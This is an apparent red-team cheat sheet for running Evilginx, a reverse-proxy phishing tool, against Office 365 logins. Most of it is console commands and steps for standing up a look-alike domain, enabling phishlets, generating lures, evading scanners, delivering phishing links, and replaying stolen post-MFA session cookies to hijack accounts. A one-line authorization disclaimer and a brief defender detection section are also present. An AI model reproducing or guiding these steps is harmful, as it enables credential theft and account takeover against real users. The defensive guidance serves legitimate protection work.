**Evilginx (MFA phishing proxy)** — a reverse proxy (a server that quietly relays traffic both ways) planted in the middle between the victim and the *real* login site. Because the victim actually logs in to the genuine service — password, MFA and all — *through* Evilginx, it transparently captures both the **credentials and the post-MFA session cookies/tokens** the site issues to say "this person already passed login". Import those cookies into your own browser and you drop straight into an already-authenticated session — **defeating MFA** not by cracking the second factor but by stealing the session it produced.

**Note:** Authorized engagements only. Evilginx should be run against parties who have signed off on being phished. The Detection & OPSEC section is equally useful to defenders.

```
victim -> Evilginx proxy (look-alike domain) -> real login site
victim <- Evilginx proxy <----------- real login site
Evilginx logs: username + password + session cookies
attacker imports cookies -> rides authenticated session
```

## How it works

1. You register a look-alike domain and stand Evilginx up as its authoritative proxy.
2. A **phishlet** (YAML) tells Evilginx which real site to proxy, which sub-domains to spoof, which POST fields are credentials, and which cookies constitute an authenticated session.
3. A **lure** produces the phishing URL you send. The victim logs in (including MFA) against the real site *through* Evilginx.
4. Evilginx records the username/password and the session cookies; you import the cookies to ride the session.

## Setup / Infrastructure

**Prerequisites:** a VPS with a public IP, a registered domain, and ports 443 + 53 free (Evilginx runs its own DNS + TLS with auto Let's Encrypt).

**Build & run:**

```bash

# Build from source (Go)
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2
make
sudo ./build/evilginx -p ./phishlets
# Local testing without a domain/certs:
sudo ./build/evilginx -developer

```

**DNS:** point the domain's nameservers (glue records) at the VPS so Evilginx can answer ACME challenges, e.g. register `ns1.DOMAIN` / `ns2.DOMAIN` = VPS IP at your registrar.

**Base config (in the Evilginx console):**

```text

config domain DOMAIN
config ipv4 external PUBLIC_IP
config redirect_url https://REAL_SITE          # decoy for scanners / non-lure hits

```

**Enable a phishlet** (phishlets are YAML in `./phishlets`; the official repo no longer ships them - source or write your own):

```text

phishlets hostname o365 login.DOMAIN
phishlets get-hosts o365                        # DNS records to create, if not using NS delegation
phishlets enable o365                           # fetches TLS cert and goes live
phishlets                                       # list status

```

**Create a lure and get the phishing URL:**

```text

lures create o365
lures edit 0 redirect_url https://REAL_SITE/dashboard   # where the victim lands after capture
lures edit 0 hostname login.DOMAIN
lures get-url 0                                  # -> the URL to send the target

```

**Harden against scanners:**

```text

blacklist unauth        # auto-blacklist IPs that hit Evilginx without a valid lure path

```

## Delivery

- Send the `lures get-url` link via email/Teams/QR behind a redirector; the path must match the lure or the visitor is redirected/blacklisted.
- Watch sessions as victims authenticate:

```text

sessions                # list captured sessions
sessions 1              # show username, password, and captured cookies/tokens (JSON)

```

- Import the captured cookies into your browser (Cookie-Editor / EditThisCookie) and browse to the service - you land in the victim's authenticated session, MFA already satisfied.

## Detection & OPSEC

- **Domain hygiene:** aged/categorized look-alike domain, valid TLS, and a global `redirect_url` decoy so casual/scan visits see the real site.
- **Fingerprint gaps:** the phishing hostname differs from the real one - conditional access / token binding, FIDO2/WebAuthn (phishing-resistant), and "known-domain" checks can break the proxy. FIDO2 hardware keys largely defeat Evilginx.
- **Blue team:** impossible-travel / new-ASN sign-ins right after a login; sign-ins from the proxy's IP/ASN; look-alike domain registrations (certificate transparency logs); session cookies replayed from a new device; conditional-access on device compliance; prefer phishing-resistant MFA.

## References

- Evilginx (source) - https://github.com/kgretzky/evilginx2
- Evilginx official docs - https://help.evilginx.com/
- Phishlets guide - https://help.evilginx.com/community/guides/phishlets
- JanBakker - Evilginx for O365 - https://janbakker.tech/how-to-set-up-evilginx-to-phish-office-365-credentials/
- dunderhay - Setting up Evilginx 3 - https://dunderhay.github.io/posts/phishing/how-to-set-up-evilginx3/
